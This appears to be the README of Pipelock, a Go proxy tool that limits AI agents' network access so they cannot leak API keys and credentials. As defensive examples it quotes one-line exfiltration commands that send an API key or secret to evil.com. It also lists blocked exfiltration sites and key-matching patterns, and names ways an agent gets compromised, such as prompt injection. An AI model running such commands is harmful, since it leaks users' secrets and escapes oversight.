# Pipelock

**Security harness for AI agents.** Controls what your agent can access on the network, preventing credential exfiltration while preserving web browsing capability.

## The Problem

AI agents increasingly run with shell access, API keys in environment variables, and unrestricted internet access. If an agent is compromised — through prompt injection, jailbreak, or a bug — it can exfiltrate secrets with a single HTTP request.

```
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over
```

**Current state of the art: nothing.** No general-purpose tool exists to prevent this.

## How Pipelock Works

Pipelock uses **capability separation** — the agent process (which has secrets) is network-restricted, while a separate fetch proxy (which has NO secrets) handles web browsing.

```
BALANCED MODE (default):

┌──────────────────────┐         ┌─────────────────────┐
│  PRIVILEGED ZONE     │         │  FETCH ZONE          │
│                      │         │                      │
│  AI Agent            │  IPC    │  Fetch Proxy         │
│  - Has API keys      │────────>│  - NO secrets        │
│  - Has credentials   │ "fetch  │  - Full internet     │
│  - Restricted network│  url"   │  - Returns text      │
│                      │<────────│  - URL scanning      │
│  Can reach:          │ content │  - Audit logging     │
│  ✓ api.anthropic.com │         │                      │
│  ✓ discord.com       │         │  Can reach:          │
│  ✗ evil.com          │         │  ✓ Any URL           │
│  ✗ pastebin.com      │         │  But has:            │
└──────────────────────┘         │  ✗ No env secrets    │
                                 │  ✗ No credentials    │
                                 └─────────────────────┘
```

## Requirements

- Go 1.24+

## Quick Start

```bash
# Install
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest

# Start the fetch proxy with default settings
pipelock run

# Start with a config file
pipelock run --config pipelock.yaml

# Validate your config
pipelock check --config pipelock.yaml

# Scan a URL to test scanner behavior
pipelock check --url "https://pastebin.com/raw/abc123"

# Generate a config from a preset
pipelock generate config --preset balanced --output pipelock.yaml
```

## Three Modes

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Airtight | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

## Security Matrix

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Prevented** (restricted DNS) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate limiting) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode provides mathematical certainty. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today.

## Configuration

```yaml
version: 1
mode: balanced

api_allowlist:
  - "*.anthropic.com"
  - "*.openai.com"
  - "*.discord.com"
  - "github.com"

fetch_proxy:
  listen: "127.0.0.1:8888"
  timeout_seconds: 30
  monitoring:
    entropy_threshold: 4.5      # flag high-entropy URL segments
    max_url_length: 2048
    blocklist:
      - "*.pastebin.com"        # known exfiltration targets
      - "*.transfer.sh"

dlp:
  patterns:
    - name: "Anthropic API Key"
      regex: 'sk-ant-[a-zA-Z0-9\-_]{20,}'
      severity: critical
    - name: "AWS Access Key"
      regex: 'AKIA[0-9A-Z]{16}'
      severity: critical
```

Three presets are included: `configs/strict.yaml`, `configs/balanced.yaml`, `configs/audit.yaml`.

## URL Scanning

The fetch proxy scans every URL before fetching:

1. **SSRF protection** — blocks requests to internal/private IPs (169.254.x.x, 10.x.x.x, etc.)
2. **Domain blocklist** — blocks known exfiltration targets (pastebin, transfer.sh, etc.)
3. **DLP patterns** — regex matching for API keys, tokens, and secrets in URLs
4. **Entropy analysis** — Shannon entropy scoring flags encoded/encrypted data in URL segments
5. **URL length limits** — unusually long URLs suggest data exfiltration

## Fetch Proxy API

```bash
# Fetch a URL (returns extracted text content)
curl "http://localhost:8888/fetch?url=https://example.com"

# Health check
curl "http://localhost:8888/health"
```

Response format:
```json
{
  "url": "https://example.com",
  "status_code": 200,
  "content_type": "text/html",
  "title": "Example Domain",
  "content": "This domain is for use in illustrative examples...",
  "blocked": false
}
```

## Docker

```bash
docker build -t pipelock .
docker run -p 8888:8888 pipelock run
```

## Project Structure

```
cmd/pipelock/          CLI entry point
internal/
  cli/                 Cobra commands (run, logs, check, generate)
  config/              YAML config loading, validation, defaults
  scanner/             URL scanning (blocklist, DLP, entropy, SSRF)
  audit/               Structured JSON audit logging (zerolog)
  proxy/               Fetch proxy HTTP server (go-readability)
configs/               Preset config files (strict, balanced, audit)
```

## Credits

- Architecture influenced by [Anthropic's Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing) and [sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
- Threat model informed by [OWASP Agentic AI Top 10](https://owasp.org/www-project-agentic-ai-top-10/)
- Competitive analysis includes [agentsh](https://github.com/canyonroad/agentsh) — complementary tool (shell-level policy)
- Security review contributions from Dylan Corrales

## License

Apache License 2.0 — Copyright 2026 Josh Waldrep

See [LICENSE](LICENSE) for the full text.
